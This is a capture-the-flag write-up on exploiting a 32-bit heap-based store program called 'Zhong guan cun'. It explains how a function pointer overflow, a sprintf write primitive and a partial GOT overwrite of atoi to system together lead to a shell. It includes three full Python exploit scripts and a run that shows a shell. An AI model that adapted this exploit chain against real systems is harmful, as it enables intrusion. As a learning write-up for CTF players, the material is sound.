### Solved by barrebas

We're entering a CTF almost every weekend now, but they've been really tough. I did not manage to exploit this challenge in time, but one day after the CTF ended I had an epiphany and got my exploit working. I figured I'd share how I approached this challenge for future reference. 

For this pwnable, called `Zhong guan cun`, we're given a 32-bit ELF binary and libraries. The task is to exploit it remotely and grab a flag. As said, I did not manage to grab the flag, but I got the exploit working locally. 

The binary represents some kind of online store testing program, where we're able to set a name and add items to the shop. Then, we can try out said shop, buying the items and asking for wholesale prices. We *cannot* modify any entry, nor delete anything after we've set it. 

Playing around with the binary a bit, I noticed that it immediately quit when attempting to overflow a buffer. 

```bash
*********************************
*** Welcome to Zhong Guan Cun ***
*********************************
Are you dreaming of becoming a Milli$_$naire?
Come to sell some electronics!

a) Register my store
b) Try my store
c) Exit
Your choice? a
What's the name of your store? BLEH
a) Sell a phone
b) Sell a watch
c) Generate a store menu
d) Return to main menu
Your choice? a
Phone's name? PHONE1
1) Android OS
2) iOS
3) Windows OS
4) Blackberry OS
5) Symbian OS
Choose Phone's OS? 1
Phone's price? 99999999999
Phone's description? PHONE1
New phone added successfully!
a) Sell a phone
b) Sell a watch
c) Generate a store menu
d) Return to main menu
Your choice? c
<<< Store Name: BLEH >>>
=== Items in the store ===
1) Android OS Phone PHONE1 price: 2147483647 CNY description: PHONE1
Congraz! Your store menu is generated successfully!
a) Sell a phone
b) Sell a watch
c) Generate a store menu
d) Return to main menu
Your choice? AAAAAAAAAAAAAAAAAAAAAAAAA
Input is Too Long.
$
```

I reversed the item struct. The items are stored on the heap and we can't have more than 16 items in total. 

```
                .-- ptr to two function addresses
                |             .-- start of phone/watch name, 0x20 bytes long
                v             v
0x8257008:  0x08049b70  0x41414141  0x41414141  0x41414141
0x8257018:  0x41414141  0x41414141  0x41414141  0x41414141
                              .-- start of phone/watch description, 0x50 bytes long
                              v
0x8257028:  0x00414141  0x42424242  0x42424242  0x42424242
0x8257038:  0x42424242  0x42424242  0x42424242  0x42424242
0x8257048:  0x42424242  0x42424242  0x42424242  0x42424242
0x8257058:  0x42424242  0x42424242  0x42424242  0x42424242
0x8257068:  0x42424242  0x42424242  0x42424242  0x42424242
0x8257078:  0x00424242  0x000003e8
                              ^
                              `-- price
```

After finding the function that reads in the input, I tried to find an overflow or off-by-one vulnerability, but everything was locked down tight. There was, however, another thing that caught my attention.

Heaps of fun
------------

We have to corrupt some piece of memory somewhere, but the items themselves are not going to cut it. We do, however, have control over the store menu string. This turned out to be the key. If I first added an item, then generated the store menu string and finally added a second item, the layout of the items and store menu on the heap was like this:

```
gdb-peda$ x/20wx 0x804b300
              .-- ptr to store menu string
              v
0x804b300:  0x0804c088  0x00000000  0x00000000  0x00000000
0x804b310:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b320:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b330:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b340:  0x0804c008  0x0804cbb8  0x00000000  0x00000000
              ^           ^
              `-- item1   |
                          `-- item2
    e.g. item1 | store_menu | item2
```

The store description string was in between the items on the stack. The items contained a pointer to two function address:

```
                .-- ptr to two function addresses
                |             .-- start of phone/watch name, 0x20 bytes long
                v             v
0x8257008:  0x08049b70  0x41414141  0x41414141  0x41414141
                   ^
                   |
                   `--- this value points to two functions:
gdb-peda$ x/2wx 0x08049b70
0x8049b70:  0x08049466  0x080492fe
```

If I could somehow overwrite that pointer of an item by overflowing the store description string, I could possible get code execution (it was nowhere near that easy, but bear with me). I started trying to generate large items, and indeed, I could overflow the function pointer of the second item using large inputs. The trick was to also set the price to a negative value, giving me just enough bytes to overflow. I whipped up a poc python script to do this for me. The layout and some functions of this poc are heavily inspired by [saelo](https://gist.github.com/saelo/9e6934b3c40cf42e3f87)!

```python
from socket import *
import struct, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 6666))
    
    # pause to allow gdb to attach
    raw_input()
    
    # register store
    readtil('choice?')
    sendln('a')     
    readtil('store?')
    sendln("S"*63)  # store name; maximum allowed, need it to overflow a buffer later!
    
    # the program *needs* to have an item to sell before it can generate a store menu
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*0x4f)
    
    # generate store menu. this will be 0xb20 bytes large, on the heap. 
    readtil('choice?')
    sendln('c')

    # second item, will be allocated after the store menu string
    # this is the one whose function pointer we will corrupt
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('9'*0xf) # this will make the price of this item 0x7fffffff, ready to be abused later
    readtil('description?')
    sendln('B'*0x4f) 
    
    # allocate the rest of the items
    for i in range(13):
        readtil('choice?')
        sendln('a')     # sell a phone
        readtil('name?')
        sendln('A'*0x1f)
        readtil('OS?')
        sendln('4')
        readtil('price?')
        sendln('-'+'9'*0xe) # for these, we'll need the minus sign.
        readtil('description?')
        sendln('B'*0x4f)    
    
    # overflow
    readtil('choice?')
    sendln('a')
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*(0x4f-4)+'CCCC')     # overflow with 0x43434343

    readtil('choice?')
    sendln('c') # generate store menu & overflow; 2nd item now points to 0x43434343

    raw_input()
pwn()

```

And in action:

```
gdb-peda$ x/40x 0x804b300
0x804b300:  0x08a50088  0x00000000  0x00000000  0x00000000
0x804b310:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b320:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b330:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b340:  0x08a50008  0x08a50ba8  0x08a50c28  0x08a50ca8
0x804b350:  0x08a50d28  0x08a50da8  0x08a50e28  0x08a50ea8
0x804b360:  0x08a50f28  0x08a50fa8  0x08a51028  0x08a510a8
0x804b370:  0x08a51128  0x08a511a8  0x08a51228  0x08a512a8
0x804b380:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b390:  0x00000000  0x00000000  0x00000000  0x00000000

# let's have a look at the second item:

gdb-peda$ x/40wx 0x08a50ba8
            .-- now overwritten!
            v
0x8a50ba8:  0x43434343  0x41414100  0x41414141  0x41414141
0x8a50bb8:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50bc8:  0x00414141  0x04b03741  0x41414108  0x41414141
0x8a50bd8:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50be8:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50bf8:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50c08:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50c18:  0x00414141  0x7fffffff  0x00000003  0x00000081
            .-- normal pointer
            v
0x8a50c28:  0x08049b70  0x41414141  0x41414141  0x41414141
0x8a50c38:  0x41414141  0x41414141  0x41414141  0x41414141
```

I was ready to rock & roll! I dumped in an address of a gadget, hoping to get code execution. There were, however, two small problems. First, the binary takes the pointer stored at the start of the item struct and then derefences it to get a second pointer to a function:

```
;;; triggered when asking for a wholesale price
 8048fdd: call   804897b <exit@plt+0x1ab>    ; this call will be important in a few moments
 8048fe2: pop    eax                         ; 
 8048fe3: pop    edx                         ;
 8048fe4: mov    eax,DWORD PTR [esi]         ; esi is *item, so this loads 0x08049b70 into eax
 8048fe6: push   edi                         ; input for function
 8048fe7: push   esi                         ; 
 8048fe8: call   DWORD PTR [eax]             ; this derefences 0x08049b70, effectively calling 0x08049466
```

So I needed to have a pointer to a pointer on the heap. I had no way of leaking the heap address yet. I tried to overflow using the address of a got pointer so I could use `sprintf` to leak further information, but then the function at `0x8048fdd` reared its ugly head:

```
 ;; strange function, opens /dev/zero, tries to read one byte and then closes it
 804897b: push   ebp
 804897c: mov    ebp,esp
 804897e: push   esi
 804897f: push   ebx
 8048980: push   edx
 8048981: push   edx
 8048982: push   0x0
 8048984: push   0x80495ce                 ; /dev/zero
 8048989: mov    esi,DWORD PTR [ebp+0x8]
 804898c: call   80486d0 <open@plt>
 8048991: add    esp,0x10
 8048994: test   eax,eax
 8048996: mov    ebx,eax
 8048998: jns    80489a4 <exit@plt+0x1d4>
 804899a: sub    esp,0xc
 804899d: push   0x1
 804899f: call   80487d0 <exit@plt>
 80489a4: push   eax
 80489a5: push   0x1
 80489a7: push   DWORD PTR [esi]           ; read *buf =0x8049b70
 80489a9: push   ebx
 80489aa: call   8048750 <read@plt>        ; read one byte into non-readable buffer, huh?
 80489af: add    esp,0x10
 80489b2: dec    eax                       ; eax = -1, of course
 80489b3: je     804899a <exit@plt+0x1ca>  ; if eax was zero, the program would exit() --> protection against rwxp?
 80489b5: mov    DWORD PTR [ebp+0x8],ebx   ; ebx = fd
 80489b8: lea    esp,[ebp-0x8]
 80489bb: pop    ebx
 80489bc: pop    esi
 80489bd: pop    ebp
 80489be: jmp    8048790 <close@plt>
```

I didn't see it at first, until I overwrote the function pointer in the item struct with a got address. This address is readable and writeable. This function then tries to read a byte from `/dev/zero` into the function pointer. If it fails, no problem, execution will happily continue. If it succeeds, however, it will immediately halt execution of the binary. I was in trouble! 

I could not call imported functions from the got, nor could I just find any old gadget. Because of the dereferencing, the address of the gadget had to be present in the binary in a non-writeable section!

Finally, I turned to a function that was already in the binary, used for watches:

```
gdb-peda$ x/2wx 0x8049b60
0x8049b60:  0x0804935e  0x0804932e
```

The first function is called when asking for a wholesale price. However, the second function at `0x0804932e` is used in the generation of the store menu. 

Tricky overflow
---------------

That function at `0x0804932e` looks like this:

```
 804932e: push   ebp
 804932f: mov    ebp,esp
 8049331: sub    esp,0x10
 8049334: mov    eax,DWORD PTR [ebp+0x8]
 8049337: lea    edx,[eax+0x24]
 804933a: push   edx
 804933b: lea    edx,[eax+0x4]                   ; name
 804933e: push   DWORD PTR [eax+0x74]            ; price
 8049341: push   edx                             ; description
 8049342: imul   eax,DWORD PTR [eax+0x78],0x14   ; type of watch
 8049346: add    eax,0x804b140
 804934b: push   eax
 804934c: push   0x80495aa                       ; format string
 8049351: push   DWORD PTR [ebp+0xc]             ; char *buffer: ATTACKER-SUPPLIED!
 8049354: call   80486c0 <sprintf@plt>
 8049359: add    esp,0x20
 804935c: leave  
 804935d: ret    
```

I chose to overwrite the function pointer in the item struct with  with `0x8049b64`. This causes the program to call `0x804932e` instead of the 'get wholesale price'-function **with an attacker supplied argument**. This will allow me to overwrite a piece of memory with the generated string. If I set the description or name of an item correctly and I applied a correct offset, I could overwrite anything I want. There was some collateral damage to surrounding memory, however, making it impossible to overwrite a got pointer directly. The program contains another puzzle piece and I wanted to gain control over that instead.

Going for the big bucks
-----------------------

On the heap was an integer (or DWORD) that holds the amount of money that the simulated store customer has. The program substracts from this amount when a purchase is done, making it potentially a write-primitive. The *pointer* to this heap address lives at `0x804b280`. I wanted to overwrite this pointer with the address of `atoi@got`. Then, I would be able to update the pointer at `atoi@got`. Why `atoi`? Because it also uses one argument, just like `system`. If I could make `atoi` point to `system`, I had an easy way of spawning a shell. I modified the poc to do this:

```
from socket import *
import struct, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 6666))
    #s.connect(('146.148.60.107', 6666))
    
    # pause to allow gdb to attach
    raw_input()
    
    # register store
    readtil('choice?')
    sendln('a')     
    readtil('store?')
    # store name; maximum allowed, need it to overflow a buffer later!
    sendln("S"*63)  
    
    # the program *needs* to have an item to sell before it can generate a store menu
    readtil('choice?')
    sendln('a')
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*0x4f)
    
    # generate store menu. this will be 0xb20 bytes large, on the heap. 
    # overflow such that the store description will overwrite the second item's function pointer
    readtil('choice?')
    sendln('c')

    # second item
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln(''+'9'*0xf)  # this will make the price of this item 0x7fffffff, ready to be abused later
    readtil('description?')
    # use this later to overwrite the ptr to the money DWORD
    sendln('A'+p(0x804b038)+'A'*(0x4f-5)) # 0x804b038 = atoi@got
    
    # allocate the rest of the items
    for i in range(13):
        readtil('choice?')
        sendln('a')
        readtil('name?')
        sendln('A'*0x1f)
        readtil('OS?')
        sendln('4')
        readtil('price?')
        sendln('-'+'9'*0xe)
        readtil('description?')
        sendln('B'*0x4f)    
    
    # overflow
    readtil('choice?')
    sendln('a')
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    # 0x8049b64 is a pointer to 0x0804932e
    sendln('B'*(0x4f-4)+p(0x8049b64)) 

    # generate store menu & overflow; 2nd item now points to 0x8049b64: 0x0804932e -> sprintf function, used to overwrite ptr to money
    readtil('choice?')
    sendln('c') 
    
    readtil('choice?')
    sendln('d')
    readtil('choice?')
    sendln('b')
    print readtil('buy?')
    sendln('2')
    readtil('choice?')
    # get wholesale price, trigger function 0x0804932e
    sendln('b') 
    readtil('buy?')
    # this value is used as an argument for 0x0804932e, conveniently translated for us by atoi!
    # it is 0x804b280-51, so that the output of sprintf is aligned and will overwrite the money pointer with the address of atoi@got
    sendln('134525517') 
    readtil('choice?')

    # ok, now have control over ptr to money!
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
    
    s.close()

pwn()
```

This allowed me to write to `atoi@got`! Or so I thought. The problem is that `atoi@got` contains `0xf74e2880`, which is atoi in libc. This number is interpreted by the program as a negative amount of money. When trying to modify the value at `atoi@got`, the value it contains is passed via this block of code:

```
 8048f6b: mov    edx,DWORD PTR ds:0x804b280 ; grab location of money DWORD from money pointer (it will point to atoi@got)
 8048f71: imul   eax,DWORD PTR [esi+0x74]   ; eax contains amount of item to buy, multiply it by price of item
 8048f75: mov    ecx,DWORD PTR [edx]        ; grab money amount
 8048f77: sub    ecx,eax                    ; subtract cost from amount of money
 8048f79: js     8049008 <exit@plt+0x838>   ; jump-if-sign: if the amount of leftover money is negative, abort the transaction!
```

Since I needed to modify `atoi` (0xf74e2880) to `system` (0xf74f0c30), this `sub ecx,eax / js` block above would *never* let me modify the pointer in the global offset table to `system`. Looking back, the solution is easy, but I could not figure it out late at night. 

Take one step back
------------------

After the CTF had ended, it dawned on me: I did not have to modify the got pointer of `atoi` completely, I could modify *part* of it! After all, if I move one byte back, the value I would be modifying would be `0x4f0c30xx`; this is still a positive number! Of course, it is possible that `atoi` is located at an address such as `0xf7dff880`; in this case, it still would not work.

I updated the poc once more, to make the money object point to `atoi@got-1`. I needed to add 0x50dc3000-0x4ff88000 = 14921728 to atoi so that it points to system (at least, locally, on my box). This is done by buying item 2. It's price is set to `0x7fffffff`. Multiplying that by 14921728 gives an integer overflow to 0xff1c5000. The latter value will be subtracted from the value at atoi-1, conveniently updating the right portion of atoi!

```python
from socket import *
import struct, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 6666))
    #s.connect(('146.148.60.107', 6666))
    
    # pause to allow gdb to attach
    raw_input()
    
    # register store
    readtil('choice?')
    sendln('a')     
    readtil('store?')
    sendln("S"*63)  # store name; maximum allowed, need it to overflow a buffer later!
    
    # the program *needs* to have an item to sell before it can generate a store menu
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*0x4f)
    
    # generate store menu. this will be 0xb20 bytes large, on the heap. 
    readtil('choice?')
    sendln('c')
    
    # second item
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln(''+'9'*0xf)  # this will make the price of this item 0x7fffffff, ready to be abused later
    readtil('description?')
    sendln('A'+p(0x804b038-1)+'A'*(0x4f-5)) # 0x804b038 = atoi@got 
    
    # allocate the rest of the items
    for i in range(13):
        readtil('choice?')
        sendln('a')     # sell a phone
        readtil('name?')
        sendln('A'*0x1f)
        readtil('OS?')
        sendln('4')
        readtil('price?')
        sendln('-'+'9'*0xe)
        readtil('description?')
        sendln('B'*0x4f)    
    
    # overflow
    readtil('choice?')
    sendln('a')
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*(0x4f-4)+p(0x8049b64))

    readtil('choice?')
    sendln('c') # generate store menu & overflow into 2nd item
    
    readtil('choice?')
    sendln('d')
    readtil('choice?')
    sendln('b')
    print readtil('buy?')
    sendln('2')
    readtil('choice?')
    sendln('b') # get wholesale price
    readtil('buy?')
    sendln('134525517') # is 0x804b280-51, so that the sprintf is aligned and will overwrite the money pointer with atoi@got or snprintf@got
    readtil('choice?')
    sendln('a')
    readtil('buy?')
    sendln('14921728')  # this is the offset of atoi to system on *my* box, 58288*256 (the *256 is to compensate for the crooked ptr)
    readtil('choice?')
    sendln('a')
    readtil('buy?')
    sendln('/bin/sh;')

    # ok, should have a shell by now!
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
    
    s.close()

pwn()
```

The binary is running locally via `socat`. Running the python script lands a shell:

```bash
bas@tritonal:~/tmp/bctf/zhonguancun$ python ./zhong.py

 <<< Store Name: SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS >>>
...snip...
15) Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
16) Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBd�
Your total money: 100000 CNY.
What do you want to buy?
 whoami
bas
uname -a
Linux tritonal 3.2.0-4-amd64 #1 SMP Debian 3.2.65-1+deb7u2 x86_64 GNU/Linux
```

Unfortunately, a day too late for the CTF. 

Conclusion
----------

I had found nearly all the puzzle pieces, yet missed the final small piece. For the next CTF, I will Try Harder!

